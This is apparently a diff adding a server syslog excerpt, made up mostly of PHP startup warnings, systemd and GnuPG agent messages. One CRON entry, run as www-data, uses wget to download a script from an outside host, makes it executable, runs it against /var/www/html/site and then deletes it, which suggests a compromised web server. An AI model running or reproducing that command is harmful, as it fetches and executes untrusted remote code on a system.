@@ -1,0 +1,20 @@
+Sep 16 21:09:07 vmi147857 sessionclean[14385]: PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/20151012/igbinary.so' - /usr/lib/php/20151012/igbinary.so: cannot open shared object file: No such file or directory in Unknown on line 0
+Sep 16 21:09:07 vmi147857 sessionclean[14385]: PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/20151012/imagick.so' - /usr/lib/php/20151012/imagick.so: cannot open shared object file: No such file or directory in Unknown on line 0
+Sep 16 21:09:07 vmi147857 sessionclean[14385]: PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/20151012/msgpack.so' - /usr/lib/php/20151012/msgpack.so: cannot open shared object file: No such file or directory in Unknown on line 0
+Sep 16 21:09:07 vmi147857 sessionclean[14385]: PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/20151012/memcached.so' - /usr/lib/php/20151012/memcached.so: cannot open shared object file: No such file or directory in Unknown on line 0
+Sep 16 21:09:08 vmi147857 systemd[1]: Started Clean php session files.
+Sep 16 21:44:53 vmi147857 systemd[1]: ': /etc/default/metabase
+Sep 16 21:44:53 vmi147857 systemd[1]: Started Metabase server.
+Sep 16 21:45:01 vmi147857 CRON[19629]: (www-data) CMD (wget -q -O xxxd http://hello.hellodolly777.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /var/www/html/site 24 && rm -f xxxd)
+Sep 16 21:45:02 vmi147857 CRON[19627]: (CRON) info (No MTA installed, discarding output)
+Sep 16 22:05:56 vmi147857 systemd[22339]: Listening on GnuPG cryptographic agent and passphrase cache.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Listening on GnuPG cryptographic agent (access for web browsers).
+Sep 16 22:05:56 vmi147857 systemd[22339]: Reached target Paths.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Reached target Timers.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Sep 16 22:05:56 vmi147857 systemd[22339]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Sep 16 22:05:56 vmi147857 systemd[22339]: Reached target Sockets.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Reached target Basic System.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Reached target Default.
+Sep 16 22:05:56 vmi147857 systemd[22339]: Startup finished in 27ms.
+Sep 16 22:05:56 vmi147857 systemd[1]: Started User Manager for UID 0.
